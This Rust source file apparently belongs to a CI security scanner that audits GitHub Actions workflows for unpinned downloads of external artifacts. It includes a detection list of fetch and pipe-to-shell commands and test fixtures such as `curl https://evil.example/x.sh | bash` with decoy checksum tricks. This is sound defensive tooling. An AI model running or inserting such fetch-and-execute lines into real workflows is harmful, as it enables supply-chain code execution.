//! Cross-repo (external-artifact) taint audit.
//!
//! Detects `run:` blocks that pull third-party release artifacts via
//! `curl` / `wget` / `gh release download` / `pip install <url>` / language
//! package installers without SHA-pinning them. Emits a finding when the
//! download happens in a workflow whose permissions or triggers would let
//! the fetched artifact escalate into a supply-chain compromise.
//!
//! Zizmor does not audit this today because it focuses on `uses:` references;
//! cross-repo downloads happen inside `run:` shell commands.
//!
//! Downloads verified against an inline digest (`sha256sum --check`,
//! `gpg --verify`, `cosign verify`) are treated as pinned.

use std::path::{Path, PathBuf};
use yaml_rust2::Yaml;

use super::{AuditFinding, Severity, key_jobs, key_on, key_permissions, key_run, key_steps};

/// Patterns that flag third-party release-artifact downloads. These are
/// deliberately conservative: we only match clearly-external URLs.
const EXTERNAL_DOWNLOAD_PATTERNS: &[(&str, &str)] = &[
    ("curl -", "curl"),
    ("curl ", "curl"),
    ("curl.exe ", "curl.exe"),
    ("wget ", "wget"),
    ("wget2 ", "wget2"),
    ("aria2c ", "aria2c"),
    ("gh release download", "gh release download"),
    ("pip install -r https://", "pip install URL"),
    ("pip install https://", "pip install URL"),
    ("pip install git+https://", "pip install git+URL"),
    ("pip3 install https://", "pip3 install URL"),
    ("pip3 install git+https://", "pip3 install git+URL"),
    ("-m pip install https://", "python -m pip install URL"),
    ("-m pip install git+https://", "python -m pip install git+URL"),
    ("npm install https://", "npm install URL"),
    ("npm install git+https://", "npm install git+URL"),
    ("npm install --registry ", "npm install --registry"),
    ("npm i https://", "npm i URL"),
    ("npm i git+https://", "npm i git+URL"),
    ("yarn add https://", "yarn add URL"),
    ("go install ", "go install"),
    ("go get ", "go get"),
    ("cargo install --git", "cargo install --git"),
    ("bash <(curl", "bash <(curl ...) [pipe]"),
    ("bash -c \"$(curl", "bash -c curl"),
    ("sh <(curl", "sh <(curl ...) [pipe]"),
    ("sh -c \"$(curl", "sh -c curl"),
    ("| bash", "curl | bash"),
    ("| sh", "curl | sh"),
    // PowerShell fetchers on Windows runners.
    ("invoke-webrequest ", "Invoke-WebRequest"),
    ("invoke-restmethod ", "Invoke-RestMethod"),
    ("iwr ", "iwr"),
    ("irm ", "irm"),
];

/// URLs/hosts we treat as GitHub-upstream. Matches against run: bodies;
/// anything that names `api.github.com` or `raw.githubusercontent.com` with
/// a repo-specific path must be accompanied by a SHA to avoid a finding.
const GITHUB_RAW_PREFIXES: &[&str] = &[
    "https://github.com/",
    "http://github.com/",
    "https://raw.githubusercontent.com/",
    "http://raw.githubusercontent.com/",
    "https://api.github.com/",
];

pub(crate) fn run(
    docs: &[(PathBuf, Yaml)],
    findings: &mut Vec<AuditFinding>,
    level: crate::policy::CheckLevel,
) {
    if level.is_off() {
        return;
    }
    let is_warning = level.is_warn();
    for (file, doc) in docs {
        check_workflow(file, doc, findings, is_warning);
    }
}

fn check_workflow(file: &Path, doc: &Yaml, findings: &mut Vec<AuditFinding>, is_warning: bool) {
    let Some(map) = doc.as_hash() else {
        return;
    };

    let pr_triggered = workflow_has_pr_trigger(map.get(key_on()));
    let privileged = top_level_privileged(map.get(key_permissions()));

    let Some(Yaml::Hash(jobs)) = map.get(key_jobs()) else {
        return;
    };

    for (_job_name, job_value) in jobs {
        let Some(job_map) = job_value.as_hash() else {
            continue;
        };
        let job_privileged = privileged || top_level_privileged(job_map.get(key_permissions()));

        let Some(Yaml::Array(steps)) = job_map.get(key_steps()) else {
            continue;
        };
        for step in steps {
            let Some(step_map) = step.as_hash() else {
                continue;
            };
            let Some(run_val) = step_map.get(key_run()).and_then(Yaml::as_str) else {
                continue;
            };

            check_run_block(
                file,
                run_val,
                pr_triggered,
                job_privileged,
                findings,
                is_warning,
            );
        }
    }
}

pub(super) fn check_run_block(
    file: &Path,
    run: &str,
    pr_triggered: bool,
    privileged: bool,
    findings: &mut Vec<AuditFinding>,
    is_warning: bool,
) {
    // Normalize tabs to spaces so a tab-separated `curl\t-fsSL` still matches
    // the space-delimited download patterns.
    let lower = run.to_ascii_lowercase().replace('\t', " ");
    let block_has_digest = has_inline_digest_verification(&lower);

    // Scan line by line so an exemption covers only the download it actually
    // applies to. Previously a decoy SHA-pinned URL in a comment, or an
    // unrelated `sha256sum --check` anywhere in the block, silenced a real
    // malicious download sitting beside it.
    let mut hit: Option<&'static str> = None;
    for line in lower.lines() {
        let Some(label) = download_label_for_line(line) else {
            continue;
        };
        // A SHA-pinned GitHub URL on THIS line is provenance-equivalent to
        // `uses:@<sha>`; a pin elsewhere in the block no longer counts.
        if is_github_sha_pinned(line) {
            continue;
        }
        // A digest check only covers downloads that write an artifact to disk.
        // A pipe-to-shell (`curl | bash`, `bash <(curl)`) executes immediately
        // and can't be checksum-verified, so it is never exempted by a digest
        // line — that is exactly the decoy an attacker would add.
        if block_has_digest && !is_pipe_to_shell(line) {
            continue;
        }
        hit = Some(label);
        break;
    }
    let Some(label) = hit else { return };

    // An external download with no SHA in a workflow that writes / uses
    // secrets / is PR-triggered is the full attack story.
    let severity = if privileged && pr_triggered {
        Severity::Critical
    } else if privileged || pr_triggered {
        Severity::High
    } else {
        Severity::Medium
    };

    findings.push(AuditFinding {
        file: file.to_path_buf(),
        severity,
        title: format!("Unpinned external artifact download (`{label}`)"),
        detail: format!(
            "A `run:` block invokes `{label}` to pull a remote artifact without \
             pinning to an immutable SHA or digest. A compromised or tampered \
             upstream turns into code execution inside this workflow. Pin \
             downloads to a specific release SHA, verify the checksum inline, \
             or replace with a SHA-pinned `uses:` action. Context: privileged={privileged}, \
             pr_triggered={pr_triggered}."
        ),
        is_warning,
    });
}

/// Substring match that refuses hits embedded inside a larger word, so
/// `cargo install` does not match the `go install ` pattern and
/// `| sha256sum` does not match `| sh`. A boundary is only enforced on a
/// side where the needle itself starts/ends with a word character.
fn contains_word_bounded(haystack: &str, needle: &str) -> bool {
    const fn is_word(b: u8) -> bool {
        b.is_ascii_alphanumeric() || b == b'_' || b == b'-'
    }
    let needle_starts_word = needle.as_bytes().first().copied().is_some_and(is_word);
    let needle_ends_word = needle.as_bytes().last().copied().is_some_and(is_word);

    let mut search_from = 0;
    while let Some(pos) = haystack[search_from..].find(needle) {
        let start = search_from + pos;
        let end = start + needle.len();
        let before_ok =
            !needle_starts_word || start == 0 || !is_word(haystack.as_bytes()[start - 1]);
        let after_ok =
            !needle_ends_word || end == haystack.len() || !is_word(haystack.as_bytes()[end]);
        if before_ok && after_ok {
            return true;
        }
        search_from = start + 1;
    }
    false
}

/// Return the label of the first download pattern that matches this single
/// line (word-bounded), or `None`.
fn download_label_for_line(line: &str) -> Option<&'static str> {
    for (needle, label) in EXTERNAL_DOWNLOAD_PATTERNS {
        if contains_word_bounded(line, needle) {
            return Some(label);
        }
    }
    None
}

/// True when a line pipes/substitutes a fetch straight into a shell. Such a
/// download executes the moment it arrives, so no inline digest check can gate
/// it — only SHA-pinning the source URL makes it safe.
fn is_pipe_to_shell(line: &str) -> bool {
    line.contains("| bash")
        || line.contains("| sh")
        || line.contains("<(curl")
        || line.contains("<(wget")
        || line.contains("$(curl")
        || line.contains("$(wget")
}

/// Detect an inline digest check covering the downloaded artifact: a
/// `*sum`/`shasum` invocation with `--check`/`-c` on the same line, or a
/// signature verification (`gpg --verify`, `cosign verify*`). These abort
/// the step on mismatch, which is the pinning this audit asks for.
fn has_inline_digest_verification(lower_run: &str) -> bool {
    const SUM_TOOLS: &[&str] = &["sha256sum", "sha384sum", "sha512sum", "shasum", "b2sum"];
    for line in lower_run.lines() {
        if line.contains("gpg --verify") || line.contains("cosign verify") {
            return true;
        }
        if SUM_TOOLS.iter().any(|tool| line.contains(tool))
            && (line.contains("--check") || line.contains(" -c"))
        {
            return true;
        }
    }
    false
}

fn is_github_sha_pinned(lower_run: &str) -> bool {
    // Look for "github.com/<owner>/<repo>/...<40-hex>..." in the run: body.
    // We only de-flag lines that clearly anchor on an upstream SHA -- anything
    // else is still a finding, even if a short hash appears coincidentally.
    for prefix in GITHUB_RAW_PREFIXES {
        let Some(start) = lower_run.find(prefix) else {
            continue;
        };
        let tail = &lower_run[start + prefix.len()..];
        // Split on whitespace to bound the URL.
        let url = tail.split_whitespace().next().unwrap_or("");
        if contains_40_hex_token(url) {
            return true;
        }
    }
    false
}

fn contains_40_hex_token(s: &str) -> bool {
    // Tokenize on non-hex characters and look for any 40-hex run.
    let bytes = s.as_bytes();
    let mut run_len = 0;
    for &b in bytes {
        let is_hex = matches!(b, b'0'..=b'9' | b'a'..=b'f');
        if is_hex {
            run_len += 1;
            if run_len >= 40 {
                return true;
            }
        } else {
            run_len = 0;
        }
    }
    false
}

fn workflow_has_pr_trigger(on_val: Option<&Yaml>) -> bool {
    let Some(on) = on_val else {
        return false;
    };
    #[allow(clippy::wildcard_enum_match_arm)]
    match on {
        Yaml::String(s) => is_attacker_influenced_trigger(s),
        Yaml::Array(arr) => arr
            .iter()
            .any(|v| v.as_str().is_some_and(is_attacker_influenced_trigger)),
        Yaml::Hash(map) => map
            .keys()
            .any(|k| k.as_str().is_some_and(is_attacker_influenced_trigger)),
        _ => false,
    }
}

/// Triggers whose payload/upstream can be influenced by an outside contributor,
/// making an unpinned download in the same workflow more dangerous. Includes
/// `workflow_run` (fires off an upstream that may itself be fork-PR triggered)
/// and the `pull_request_review*` family.
fn is_attacker_influenced_trigger(name: &str) -> bool {
    matches!(
        name,
        "pull_request"
            | "pull_request_target"
            | "pull_request_review"
            | "pull_request_review_comment"
            | "issue_comment"
            | "workflow_run"
    )
}

fn top_level_privileged(perm_val: Option<&Yaml>) -> bool {
    let Some(value) = perm_val else {
        // Missing permissions inherits repo default, which in many GitHub
        // configurations is write-all. Treat as privileged.
        return true;
    };
    if value.as_str() == Some("write-all") {
        return true;
    }
    let Some(map) = value.as_hash() else {
        return false;
    };
    map.iter().any(|(_, v)| v.as_str() == Some("write"))
}

// ─── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use super::*;
    use yaml_rust2::YamlLoader;

    fn parse(src: &str) -> (PathBuf, Yaml) {
        (
            PathBuf::from("workflow.yml"),
            YamlLoader::load_from_str(src).unwrap().remove(0),
        )
    }

    fn run_check(doc: &(PathBuf, Yaml)) -> Vec<AuditFinding> {
        let mut findings = Vec::new();
        run(
            std::slice::from_ref(doc),
            &mut findings,
            crate::policy::CheckLevel::Deny,
        );
        findings
    }

    #[test]
    fn flags_curl_download_in_privileged_pr_workflow_as_critical() {
        let doc = parse(
            "
on: pull_request_target
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -L https://example.com/release.tar.gz | tar xz
",
        );
        let findings = run_check(&doc);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::Critical && f.title.contains("curl")),
            "expected CRIT curl finding, got: {findings:?}"
        );
    }

    #[test]
    fn does_not_flag_sha_pinned_github_raw_url() {
        let doc = parse(
            "
on: push
permissions: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -L https://raw.githubusercontent.com/some/repo/abcdef1234567890abcdef1234567890abcdef12/script.sh | bash
",
        );
        let findings = run_check(&doc);
        assert!(
            !findings
                .iter()
                .any(|f| f.title.contains("external artifact download")),
            "SHA-pinned GitHub raw URL should not be flagged: {findings:?}"
        );
    }

    #[test]
    fn decoy_sha_comment_does_not_exempt_malicious_download() {
        // A SHA-pinned GitHub URL in a comment on another line must NOT silence
        // a real unpinned pipe-to-shell download beside it.
        let doc = parse(
            "
on: pull_request_target
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          # see https://github.com/actions/checkout/commit/8f4b7f84864484a7bf31766abe9204da3cbe65b3
          curl https://evil.example/x.sh | bash
",
        );
        let findings = run_check(&doc);
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains("external artifact download")),
            "decoy SHA comment must not exempt the malicious download: {findings:?}"
        );
    }

    #[test]
    fn decoy_unrelated_digest_check_does_not_exempt_pipe_to_shell() {
        // An unrelated `sha256sum --check` cannot cover a pipe-to-shell download
        // (which executes immediately), so the download must still be flagged.
        let doc = parse(
            "
on: pull_request_target
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl https://evil.example/x.sh | bash
          echo '0000000000000000000000000000000000000000000000000000000000000000  README' | sha256sum --check
",
        );
        let findings = run_check(&doc);
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains("external artifact download")),
            "unrelated digest check must not exempt a pipe-to-shell download: {findings:?}"
        );
    }

    #[test]
    fn flags_curl_pipe_bash() {
        let doc = parse(
            "
on: push
permissions: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: bash <(curl https://example.com/install.sh)
",
        );
        let findings = run_check(&doc);
        assert!(
            findings.iter().any(|f| f.title.contains("curl")),
            "expected curl-pipe-bash finding, got: {findings:?}"
        );
    }

    #[test]
    fn flags_go_install_unpinned() {
        let doc = parse(
            "
on: push
permissions: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: go install github.com/some/tool@latest
",
        );
        let findings = run_check(&doc);
        assert!(
            findings.iter().any(|f| f.title.contains("go install")),
            "expected go-install finding, got: {findings:?}"
        );
    }

    #[test]
    fn does_not_flag_cargo_install_from_registry() {
        // `cargo install <crate>` must not substring-match the `go install `
        // pattern ("car[go install ]cargo-audit").
        let doc = parse(
            "
on: pull_request
permissions: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: cargo install cargo-audit --locked
",
        );
        let findings = run_check(&doc);
        assert!(
            !findings
                .iter()
                .any(|f| f.title.contains("external artifact download")),
            "registry cargo install should not be flagged: {findings:?}"
        );
    }

    #[test]
    fn does_not_flag_checksum_verified_curl_download() {
        let doc = parse(
            r#"
on: push
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -sL "https://github.com/sigstore/cosign/releases/download/v2.4.3/cosign-linux-amd64" -o cosign
          echo "caaad125acef1cb81d58dcdc454a1e429d09a750d1e9e2b3ed1aed8964454708  cosign" | sha256sum --check --strict
          chmod +x cosign
"#,
        );
        let findings = run_check(&doc);
        assert!(
            !findings
                .iter()
                .any(|f| f.title.contains("external artifact download")),
            "checksum-verified download should not be flagged: {findings:?}"
        );
    }

    #[test]
    fn does_not_flag_pipe_to_sha256sum_as_pipe_sh() {
        // `| sha256sum` must not match the `| sh` pattern.
        let doc = parse(
            r#"
on: push
permissions: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "abc  file" | sha256sum
"#,
        );
        let findings = run_check(&doc);
        assert!(
            findings.is_empty(),
            "pipe to sha256sum should not be flagged: {findings:?}"
        );
    }

    #[test]
    fn still_flags_curl_pipe_sh() {
        let doc = parse(
            "
on: push
permissions: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://example.com/install.sh | sh
",
        );
        let findings = run_check(&doc);
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains("external artifact download")),
            "curl | sh should still be flagged: {findings:?}"
        );
    }

    #[test]
    fn off_level_suppresses() {
        let doc = parse(
            "
on: pull_request_target
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -L https://example.com/release.tar.gz
",
        );
        let mut findings = Vec::new();
        run(
            std::slice::from_ref(&doc),
            &mut findings,
            crate::policy::CheckLevel::Off,
        );
        assert!(findings.is_empty());
    }
}
